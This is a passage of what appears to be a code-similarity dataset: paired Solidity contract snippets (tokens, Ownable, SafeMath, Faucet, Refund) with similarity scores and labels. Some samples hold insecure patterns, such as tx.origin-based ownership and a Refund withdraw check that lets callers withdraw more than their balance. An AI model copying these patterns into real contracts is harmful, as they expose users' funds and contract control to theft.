        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
    }
}",2,,,,,
"contract Ownable is Initializable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    
    function initialize(address sender) public initializer {
        _owner = sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    
    function owner() public view returns (address) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    uint256[50] private ______gap;
}",0.954038997,"contract Ownable is Initializable {

  address private _owner;





  event OwnershipRenounced(address indexed previousOwner);

  event OwnershipTransferred(

    address indexed previousOwner,

    address indexed newOwner

  );





  

  function initialize(address sender) public initializer {

    _owner = sender;

  }



  

  function owner() public view returns(address) {

    return _owner;

  }



  

  modifier onlyOwner() {

    require(isOwner());

    _;

  }



  

  function isOwner() public view returns(bool) {

    return msg.sender == _owner;

  }



  

  function renounceOwnership() public onlyOwner {

    emit OwnershipRenounced(_owner);

    _owner = address(0);

  }



  

  function transferOwnership(address newOwner) public onlyOwner {

    _transferOwnership(newOwner);

  }



  

  function _transferOwnership(address newOwner) internal {

    require(newOwner != address(0));

    emit OwnershipTransferred(_owner, newOwner);

    _owner = newOwner;

  }



  uint256[50] private ______gap;

}",1,,,,,
"contract ERC20Interface {

    
    function totalSupply() constant returns (uint256 totalSupply);

    
    function balanceOf(address _owner) constant returns (uint256 balance);

    
    function transfer(address _to, uint256 _value) returns (bool success);

    
    
    
    
    
    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);

    
    
    function approve(address _spender, uint256 _value) returns (bool success);

    
    function allowance(address _owner, address _spender) constant returns (uint256 remaining);

    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",0.916003058,"contract ERC20 {
  uint256 public totalSupply;
  function balanceOf(address _owner) view public returns (uint256 balance);
  function transfer(address _to, uint256 _value) public returns (bool success);
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
  function approve(address _spender, uint256 _value) public returns (bool success);
  function allowance(address _owner, address _spender) view public returns (uint256 remaining);
  event Transfer(address indexed _from, address indexed _to, uint256 _value);
  event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",1,,,,,
"contract Ownable {
    address public owner;

    
    constructor() public {
        owner = msg.sender;
    }

    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }

}",0.934213207,"contract Ownable {

  address public owner;





  

  function Ownable() public {

    owner = msg.sender;

  }





  

  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }





  

  function transferOwnership(address newOwner) public onlyOwner {

    if (newOwner != address(0)) {

      owner = newOwner;

    }

  }



}",1,,,,,
"contract ERC20Basic {
    uint public _totalSupply;
    function totalSupply() public view returns (uint);
    function balanceOf(address who) public view returns (uint);
    function transfer(address to, uint value) public;
    event Transfer(address indexed from, address indexed to, uint value);
}",0.907631572,"contract ERC20Basic {

  function totalSupply() public view returns (uint256);

  function balanceOf(address who) public view returns (uint256);

  function transfer(address to, uint256 value) public returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

}",1,,,,,
"contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint);
    function transferFrom(address from, address to, uint value) public;
    function approve(address spender, uint value) public;
    event Approval(address indexed owner, address indexed spender, uint value);
}",0.976015546,"contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint);
    function transferFrom(address from, address to, uint value) public;
    function approve(address spender, uint value) public;
    event Approval(address indexed owner, address indexed spender, uint value);
}",1,,,,,
"contract SimpleERC20Token {
    
    mapping (address => uint256) public balanceOf;

    
    string public name = ""Simple ERC20 Token"";
    string public symbol = ""SET"";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
        
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}",0.955424665,"contract	BANK_I_PFI_883				{				

										

		mapping (address => uint256) public balanceOf;								

										

		string	public		name =	""	BANK_I_PFI_883		""	;

		string	public		symbol =	""	BANK_I_PFI_IMTD		""	;

		uint8	public		decimals =		18			;

										

		uint256 public totalSupply =		416988875961585000000000000					;	

										

		event Transfer(address indexed from, address indexed to, uint256 value);								

										

		function SimpleERC20Token() public {								

			balanceOf[msg.sender] = totalSupply;							

			emit Transfer(address(0), msg.sender, totalSupply);							

		}								

										

		function transfer(address to, uint256 value) public returns (bool success) {								

			require(balanceOf[msg.sender] >= value);							

										

			balanceOf[msg.sender] -= value;  

			balanceOf[to] += value;          

			emit Transfer(msg.sender, to, value);							

			return true;							

		}								

										

		event Approval(address indexed owner, address indexed spender, uint256 value);								

										

		mapping(address => mapping(address => uint256)) public allowance;								

										

		function approve(address spender, uint256 value)								

			public							

			returns (bool success)							

		{								

			allowance[msg.sender][spender] = value;							

			emit Approval(msg.sender, spender, value);							

			return true;							

		}								

										

		function transferFrom(address from, address to, uint256 value)								

			public							

			returns (bool success)							

		{								

			require(value <= balanceOf[from]);							

			require(value <= allowance[from][msg.sender]);							

										

			balanceOf[from] -= value;							

			balanceOf[to] += value;							

			allowance[from][msg.sender] -= value;							

			emit Transfer(from, to, value);							

			return true;							

		}								



										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	}",1,,,,,
"contract Owned {
    address public owner;
    modifier onlyOwner() {
        if (msg.sender != owner) throw;
        _;
    }
    function transfer(address newOwner) public onlyOwner {
        owner = newOwner;
    }
}",0.90949356,"contract Owned {
    address public owner;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    
    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
}",1,,,,,
"contract SafeMath {
  function mul2(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
       return 0;
     }
     uint256 c = a * b;
     assert(c / a == b);
     return c;
   }

  function div2(uint256 a, uint256 b) internal pure returns (uint256) {
     uint256 c = a / b;
     return c;
  }

  function sub2(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
     return a - b;
   }

  function add2(uint256 a, uint256 b) internal pure returns (uint256) {
     uint256 c = a + b;
    assert(c >= a);
     return c;
   }
}",0.961799289,"contract SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {

    if (a == 0) {

      return 0;

    }

    uint256 c = a * b;

    assert(c / a == b);

    return c;

  }



  function safeDiv(uint256 a, uint256 b) internal pure returns (uint256) {

    

    uint256 c = a / b;

    

    return c;

  }



  function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {

    assert(b <= a);

    return a - b;

  }



  function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {

    uint256 c = a + b;

    assert(c >= a);

    return c;

  }

}",1,,,,,
"contract MyToken {
    
    string public standard = 'Token 0.1';
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    function MyToken(
        uint256 initialSupply,
        string tokenName,
        uint8 decimalUnits,
        string tokenSymbol
        ) {
        balanceOf[msg.sender] = initialSupply;              
        totalSupply = initialSupply;                        
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits;                            
        msg.sender.send(msg.value);                         
    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
        Transfer(msg.sender, _to, _value);                   
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        tokenRecipient spender = tokenRecipient(_spender);
        spender.receiveApproval(msg.sender, _value, this, _extraData);
        return true;
    }

    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (balanceOf[_from] < _value) throw;                 
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;  
        if (_value > allowance[_from][msg.sender]) throw;   
        balanceOf[_from] -= _value;                          
        balanceOf[_to] += _value;                            
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }

    
    function () {
        throw;     
    }
}",0.922451935,"contract MyToken {
    
    string public standard = &#39;Token 0.1&#39;;
    string public name;
    string public symbol;
    uint8 public decimals = 0;
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    function MyToken() {
        balanceOf[msg.sender] = 100000;              
        totalSupply = 100000;                        
        name = ""TESTBtfund.ru"";                                   
        symbol = ""TST"";                               
        decimals = 0;                            
    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
        Transfer(msg.sender, _to, _value);                   
    }

    
    function approve(address _spender, uint256 _value)
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }        

    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (balanceOf[_from] < _value) throw;                 
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;  
        if (_value > allowance[_from][msg.sender]) throw;   
        balanceOf[_from] -= _value;                          
        balanceOf[_to] += _value;                            
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }

    
    function () {
        throw;     
    }
}",1,,,,,
"contract Refund {

    mapping(address => uint) public balances;

    event LogDeposit(address sender, uint amount);
    event LogWithdrawal(address receiver, uint amount);

    function withdrawFunds(uint amount) public returns(bool success) {
        require(amount >= balances[msg.sender]);
        LogWithdrawal(msg.sender, amount);
        msg.sender.transfer(amount);
        return true;
    }

    function () public payable {
        require(msg.value > 0);
        uint change;
        uint dep;
        if(msg.value > 20) {
            dep = 20;
            change = msg.value - change;
        }
        balances[msg.sender] += dep;
        if(change > 0) balances[msg.sender] += change;
        LogDeposit(msg.sender, msg.value);
    }
}",0.986263459,"contract ventil_ii{ 

mapping(address => uint) public balances;

event LogDeposit(address sender, uint amount);
event LogWithdrawal(address receiver, uint amount);

function withdrawFunds(uint amount) public returns(bool success) {
    require(amount < balances[msg.sender]);
    LogWithdrawal(msg.sender, amount);
    msg.sender.transfer(amount);
    return true;
}

function () public payable {
    require(msg.value > 0);
    uint change;
    uint dep;
    if(msg.value > 20) {
        dep = 20;
        change = msg.value - change;
    }
    balances[msg.sender] += dep;
    if(change > 0) balances[msg.sender] += change;
    LogDeposit(msg.sender, msg.value);
}

}",1,,,,,
"contract owned {
    address public owner;

    constructor () public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner, ""Only owner has the authority"");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
}",0.932773633,"contract owned {
  address payable public owner;

    constructor () public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner, 'not the owner');
    _;
  }

  function transferOwnership(address payable newOwner) public onlyOwner {
    owner = newOwner;
  }
}",1,,,,,
"contract Burner {
    uint256 public totalBurned;

    function Purge() public {
        
        
        msg.sender.transfer(this.balance / 1000);
        assembly {
            mstore(0, 0x30ff)
            
            
            create(balance(address), 30, 2)
            pop
        }
    }

    function Burn() payable {
        totalBurned += msg.value;
    }
}",0.964315061,"contract OmnisBitBurner {

    uint256 public totalBurned;



    function Purge() public {

        

        

        msg.sender.transfer(this.balance / 1000);

        assembly {

            mstore(0, 0x30ff)

            

            

            create(balance(address), 30, 2)

            pop

        }

    }



    function Burn() payable {

        totalBurned += msg.value;

    }

}",1,,,,,
"contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  function Ownable() public {
    owner = tx.origin;
  }

  modifier onlyOwner() {
    require(tx.origin == owner);
    _;
  }

  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    require(newOwner != owner);

    owner = newOwner;
    emit OwnershipTransferred(owner, newOwner);
  }
}",0.911213958,"contract Ownable {



    address public owner;



    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    

    function Ownable() public {

        owner = msg.sender;

        OwnershipTransferred(0, owner);

    }



    

    function transferOwnership(address _newOwner)

        public

        onlyOwner

    {

        require(_newOwner != 0);



        OwnershipTransferred(owner, _newOwner);

        owner = _newOwner;

    }



}",2,,,,,
"contract owned {
    address public owner;

    function constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}",0.953518828,"contract owned {
    address public owner;

    function owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}",1,,,,,
"contract TokenERC20 {
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function constructor(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        emit Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        emit Burn(_from, _value);
        return true;
    }
}",0.990203096,"contract CCPLUS {
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function CCPLUS(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        emit Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        emit Burn(_from, _value);
        return true;
    }
}",1,,,,,
"contract IERC20 {
    function balanceOf(address) public view returns (uint256);
}",0.972743628,"contract ERC20 {

    function balanceOf(address) public view returns (uint256);

}",1,,,,,
"contract MyTokenI {function transfer(address _to, uint256 _value) public; }",0.912014108,"contract TokenERC20 {
  function transfer(address _to, uint256 _value) public;
}",1,,,,,
"contract ERC20Interface {
  
  function transfer(address _to, uint256 _value) public;
  
  function balanceOf(address _owner) public constant returns (uint256 balance);
}",0.920172417,"contract token {



    function balanceOf(address _owner) public constant returns (uint256 balance);

    

    

    function transfer(address _to, uint256 _value) public;



}",1,,,,,
"contract Ownable {

  address public owner;
  event OwnershipTransferred (address indexed _from, address indexed _to);

  
  function Ownable() public{
    owner = msg.sender;
    emit OwnershipTransferred(address(0), owner);
  }

  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    owner = newOwner;
    emit OwnershipTransferred(owner,newOwner);
  }
}",0.923080238,"contract Ownable {
    address public owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    function Ownable() public {
        owner = msg.sender;
        OwnershipTransferred(address(0), msg.sender);
    }

    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            OwnershipTransferred(owner, newOwner);
            owner = newOwner;
        }
    }

}",1,,,,,
"contract ERC20Token is StandardERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;

    constructor(string _name, string _symbol, uint8 _decimals) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }
}",0.949235746,"contract DetailedERC20 is ERC20 {

  string public name;

  string public symbol;

  uint8 public decimals;



  constructor(string _name, string _symbol, uint8 _decimals) public {

    name = _name;

    symbol = _symbol;

    decimals = _decimals;

  }

}",1,,,,,
contract Mortal { address owner; function Mortal() { owner = msg.sender; } function kill() { if (msg.sender == owner) suicide(owner); }},0.926212401,"contract Mortal {
    
    address owner;

    
    function Mortal() { owner = msg.sender; }

    
    function kill() { if (msg.sender == owner) selfdestruct(owner); }
}",1,,,,,
contract Mortal {          address owner;      function Mortal() { owner = msg.sender; }        function kill() { if (msg.sender == owner) selfdestruct(owner); }},0.936116239,"contract mortal
{
    address owner;

    function mortal() { owner = msg.sender; }
    function kill() { if(msg.sender == owner) selfdestruct(owner); }
}",1,,,,,
"contract ERC20Basic {
    uint public _totalSupply;
    function totalSupply() public view virtual returns (uint);
    function balanceOf(address who) public virtual view returns (uint);
    function transfer(address to, uint value) public virtual;
    event Transfer(address indexed from, address indexed to, uint value);
}",0.907859872,"contract ERC20Basic {
    uint public _totalSupply;
    function totalSupply() public constant returns (uint);
    function balanceOf(address who) public constant returns (uint);
    function transfer(address to, uint value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
}",1,,,,,
"contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view virtual returns (uint);
    function transferFrom(address from, address to, uint value) public virtual;
    function approve(address spender, uint value) public virtual;
    event Approval(address indexed owner, address indexed spender, uint value);
}",0.925983508,"contract ERC20 is ERC20Basic {

  function allowance(address owner, address spender)

    public view returns (uint256);

  function transferFrom(address from, address to, uint256 value)

    public;

  function approve(address spender, uint256 value) public returns (bool);

  event Approval(

    address indexed owner,

    address indexed spender,

    uint256 value

  );

}",1,,,,,
contract SimpleStorage { uint storedData = 4; function set(uint x) { storedData = x; } function get() constant returns (uint retVal) { return storedData; }},0.939152145,"contract SimpleStorage {
    uint storedData;

    function set(uint x) {
        storedData = x;
    }

    function get() constant returns (uint storedData) {
        return storedData;
    }
}",1,,,,,
"contract Ownable {

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    
    constructor () public {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    
    function owner() public view returns (address) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(isOwner(), 
            ""Ownable(101) - msg.sender is not the owner."");
        _;
    }

    
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), 
            ""Ownable(201) - newOwner cannot be 0x0"");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}",0.95511184,"contract Ownable {

    address private _owner;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    

    constructor () internal {

        _owner = msg.sender;

        emit OwnershipTransferred(address(0), _owner);

    }



    

    function owner() public view returns (address) {

        return _owner;

    }



    

    modifier onlyOwner() {

        require(isOwner(), ""Ownable: caller is not the owner"");

        _;

    }



    

    function isOwner() public view returns (bool) {

        return msg.sender == _owner;

    }



    

    function renounceOwnership() public onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }



    

    function transferOwnership(address newOwner) public onlyOwner {

        _transferOwnership(newOwner);

    }



    

    function _transferOwnership(address newOwner) internal {

        require(newOwner != address(0), ""Ownable: new owner is the zero address"");

        emit OwnershipTransferred(_owner, newOwner);

        _owner = newOwner;

    }

}",1,,,,,
"contract Ownable {

  address public owner;

  function Ownable() public {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    owner = newOwner;
  }
}",0.971270104,"contract Ownable {

  address public owner;





  

  function Ownable() public {

    owner = msg.sender;

  }





  

  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }





  

  function transferOwnership(address newOwner) public onlyOwner {

    if (newOwner != address(0)) {

      owner = newOwner;

    }

  }



}",1,,,,,
"contract Faucet {

    
    function withdraw(uint withdraw_amount) public {

        
        require(withdraw_amount <= 100000000000000000);

        
        msg.sender.transfer(withdraw_amount);
    }

    
    function () public payable {}

}",0.945113688,"contract Faucet {

    

    

    function withdraw(uint withdraw_amount) public {

        

        

        require(withdraw_amount<=1000000000000);

        

        

        msg.sender.transfer(withdraw_amount);

    }

    

    

    function () public payable {}

    

}",1,,,,,
"contract owned {

    address owner;

    
    function owned() { owner = msg.sender; }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}",0.963088779,"contract Owned {

    
    address owner;

    
    function Owned() {
        owner = msg.sender;
    }

    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}",1,,,,,
"contract tokenA { function transfer(address receiver, uint amount){  } }",0.969027877,"contract token { function transfer(address receiver, uint amount){  } }",0,,,,,
"contract tokenB { function transfer(address receiver, uint amount){  } }",0.969027877,"contract token { function transfer(address receiver, uint amount){  } }",0,,,,,
"contract TokenERC20 {
            
            string public name;
            string public symbol;
            uint8 public decimals = 18;
            
            uint256 public totalSupply;

            
            mapping (address => uint256) public balanceOf;
            mapping (address => mapping (address => uint256)) public allowance;

            
            event Transfer(address indexed from, address indexed to, uint256 value);

            
            event Burn(address indexed from, uint256 value);

            
            function TokenERC20(uint256 initialSupply , string tokenName , string tokenSymbol) public {

                totalSupply  = 250000000  ** uint256(18); 
                balanceOf[msg.sender]  = totalSupply;                
                name  = ""PONTEM"";                                   
                symbol  = ""PXM"";                               
            }

            

function _transfer (address _from, address _to, uint _value) internal {
                
                require(_to != 0x0);
                
                require(balanceOf[_from] >= _value);
                
                require(balanceOf[_to] + _value > balanceOf[_to]);
                
                uint previousBalances = balanceOf[_from] + balanceOf[_to];
                
                require(!frozenAccount[_from]);                     
                require(!frozenAccount[_to]);                       
                balanceOf[_from] -= _value;
                
                balanceOf[_to] += _value;
                Transfer(_from, _to, _value);
                
                assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
            }
            }",0.905232502,"contract TokenERC20 {

    

    string public name;

    string public symbol;

    uint8 public decimals = 18;

    

    uint256 public totalSupply;



    

    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



    

    event Transfer(address indexed from, address indexed to, uint256 value);



    

    event Burn(address indexed from, uint256 value);



    

    function TokenERC20(

    ) public {

        totalSupply =  100000000000 * 10 ** uint256(decimals);  

        balanceOf[msg.sender] = totalSupply;                

        name =""Love Wine Coin"";                                   

        symbol = ""LOVC"";                               

    }



    

    function _transfer(address _from, address _to, uint _value) internal {

        

        require(_to != 0x0);

        

        require(balanceOf[_from] >= _value);

        

        require(balanceOf[_to] + _value > balanceOf[_to]);

        

        uint previousBalances = balanceOf[_from] + balanceOf[_to];

        

        balanceOf[_from] -= _value;

        

        balanceOf[_to] += _value;

        Transfer(_from, _to, _value);

        

        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);

    }



    

    function transfer(address _to, uint256 _value) public {

        _transfer(msg.sender, _to, _value);

    }



    

    

    

    

    

    

    



    

    

    

    

    

    



    

    

    

    

    

    

    

    

    

    



    

    

    

    

    

    

    

    



    

    

    

    

    

    

    

    

    

    

}",1,,,,,
"contract token {
    
    string public standard = 'Token 0.1';
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    function token(
        uint256 initialSupply,
        string tokenName,
        uint8 decimalUnits,
        string tokenSymbol
        ) {
        balanceOf[msg.sender] = initialSupply;              
        totalSupply = initialSupply;                        
